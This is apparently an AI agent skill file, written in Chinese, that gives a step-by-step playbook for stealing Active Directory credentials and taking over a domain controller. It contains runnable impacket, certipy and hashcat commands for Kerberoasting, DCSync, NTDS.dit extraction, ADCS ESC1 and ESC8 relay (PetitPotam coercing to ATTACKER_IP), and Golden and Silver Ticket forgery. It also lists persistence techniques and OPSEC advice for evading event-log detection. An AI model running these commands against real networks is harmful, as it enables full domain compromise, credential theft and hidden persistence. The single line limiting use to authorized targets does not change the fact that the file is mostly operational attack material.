---
name: ad-credential-theft
description: AD 凭据窃取与域控接管：DCSync、NTDS.dit 离线提取、ADCS ESC1-ESC8 全谱、Kerberoast/AS-REP 实战、Golden/Silver Ticket、Skeleton Key 与 DCShadow 判定
whenToUse: 已有域内立足点（普通域用户或本地管理员），目标是拿 Domain Admin 或 krbtgt
role: internal
enabled: true
---

# AD 凭据窃取与域控接管

> 与 `ad-attacks` 的分工：那份讲「域是什么、怎么枚举」；这份讲「凭据怎么拿到、域控怎么接管」。

## 一、先确认你在域里的位置

```bash
# 是否有域凭据、能否 LDAP 查询
nxc smb DC01.target.local -u user -p 'pass' -d target.local
nxc ldap DC01.target.local -u user -p 'pass' -d target.local --users --groups
# BloodHound 最短路径（先跑再选打法）
bloodhound-python -u user -p 'pass' -d target.local -ns DC01.target.local -c All
```

判定清单：普通域用户？本地管理员？有 SPN 的账户？能写 ADCS 模板？有对 DC 的复制权限？

## 二、Kerberoast / AS-REP（零成本，先做）

```bash
# Kerberoast：拉所有带 SPN 的服务账户 hash
impacket-GetUserSPNs target.local/user:pass -dc-ip DC01 -request -outputfile kerb.txt
# 爆破（hashcat 13100）
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# AS-REP Roast：不需要预认证的账户（无需任何凭据）
impacket-GetNPUsers target.local/ -usersfile users.txt -no-pass -dc-ip DC01 -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

判定：拿到 hash 只算「可离线攻击」，**爆破出明文才算确认凭据**。

## 三、DCSync（有复制权限 = 直接拿 krbtgt）

```bash
# 需要 Replicating Directory Changes / Get-Changes-All 权限
impacket-secretsdump target.local/user:pass@DC01 -just-dc-ntlm

# 或用已拿到的域管 hash 做 PtH 复制
impacket-secretsdump -hashes :NTHASH target.local/Administrator@DC01 -just-dc
```

判定依据：BloodHound 里 `GenericAll` / `WriteDacl` 到域对象，或用户属于 `Domain Controllers` / `Enterprise Admins`。

## 四、NTDS.dit 离线提取（拿不到 DCSync 时的替代）

```bash
# 方式 1：卷影副本（需 DC 本地管理员）
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
# 拉回本地解密
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 方式 2：ntdsutil IFM（更隐蔽）
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ifm" q q

# 方式 3： diskshadow 脚本（绕过 vssadmin 检测）
```

## 五、ADCS（ESC1–ESC8，最容易拿域管的面）

先枚举：

```bash
certipy find -u user@target.local -p 'pass' -dc-ip DC01 -vulnerable -stdout
```

| ESC | 条件 | 打法 |
|---|---|---|
| ESC1 | 模板允许 `ENROLLEE_SUPPLIES_SUBJECT` + 低权可注册 | 申请含 `administrator` SAN 的证书 → PKINIT 拿 TGT |
| ESC2 | 模板 `Any Purpose` EKU | 同 ESC1，用途更广 |
| ESC3 | 注册代理模板 | 用代理证书代签任意用户 |
| ESC4 | 模板 ACL 可写 | 改模板为 ESC1 形态再打 |
| ESC6 | CA 开启 `EDITF_ATTRIBUTESUBJECTALTNAME2` | 任意模板都能塞 SAN |
| ESC7 | CA 管理员权限可写 | 授予自己 ManageCA → 批证书 |
| ESC8 | CA 启用 HTTP 注册 + NTLM 中继 | 中继 DC 机器账户 → 拿 DC 证书 |

ESC1 完整利用：

```bash
# 1. 申请证书（-upn 指定目标）
certipy req -u user@target.local -p 'pass' -ca 'CORP-CA' -template 'VulnTemplate' \
  -upn administrator@target.local -dc-ip DC01

# 2. 用证书换 TGT
certipy auth -pfx administrator.pfx -dc-ip DC01
# 输出 Administrator 的 ccache / NT hash

# 3. 直接打 DC
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass DC01.target.local -just-dc
```

ESC8 中继：

```bash
# 1. 起中继到 CA 的 /certsrv/certfnsh.asp
impacket-ntlmrelayx -t http://CA01.target.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. 强制 DC 认证（PetitPotam / PrinterBug）
python3 PetitPotam.py ATTACKER_IP DC01.target.local
# 拿到 DC 机器证书 → PKINIT → DCSync
```

## 六、Golden / Silver Ticket

```bash
# Golden：需要 krbtgt hash + 域 SID
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain target.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass DC01.target.local

# Silver：只需要目标服务的机器账户 hash（不碰 DC）
impacket-ticketer -nthash MACHINE_HASH -domain-sid S-1-5-21-XXX -domain target.local \
  -spn cifs/fileserver.target.local administrator

# 伪造后验证：票据里的 PAC 是否被接受
impacket-smbclient -k -no-pass fileserver.target.local
```

## 七、隐蔽持久化（判定层级不同）

| 手段 | 需要权限 | 检测面 |
|---|---|---|
| Skeleton Key | DC 本地管理员 | 打内存补丁，重启失效，易被 AV |
| DSRM 后门 | DC 本地管理员 | 改 `DsrmAdminLogonBehavior` |
| AdminSDHolder | 域管 | 每 60 分钟自动继承 ACL |
| Golden Ticket | krbtgt hash | 改 krbtgt 密码两次才失效 |
| SID History 注入 | 域管 | 事件 4765/4766 |
| DCShadow | 域管 + 可注册 DC | 伪造复制，非常隐蔽 |

**判定纪律**：持久化手段只能在自己的授权靶标上验证，且必须在报告里写明「重启/改密后是否仍有效」。

## 八、OPSEC

- Kerberoast 会触发 4769 大量请求——控制速率，别一次拉几百个 SPN
- DCSync 触发 4662（复制权限）——只在必要时用，优先 NTDS.dit 离线
- ADCS 利用会留证书模板请求日志（4886/4887）
- 不要用 `net user /domain` 高频查询，用 LDAP 单次拉取
- Golden Ticket 的 `-duration` 别设 10 年，10 小时足够

## 九、判定纪律

| 现象 | 判定 |
|---|---|
| 拿到 Kerberoast hash | 「可离线攻击」，不是「已获取凭据」 |
| 爆破出明文 | 已确认凭据 |
| DCSync 成功导出 krbtgt | 域已完全失陷 |
| certipy 报 ESC1 但申请失败 | 未确认，要看具体错误码 |
| 有 SeMachineAccountQuota > 0 | 可加机器账户，是 ESC8 前置，不等于漏洞 |

**只报实测通过的路径，ADCS 尤其要看 `certipy` 的实际返回。**
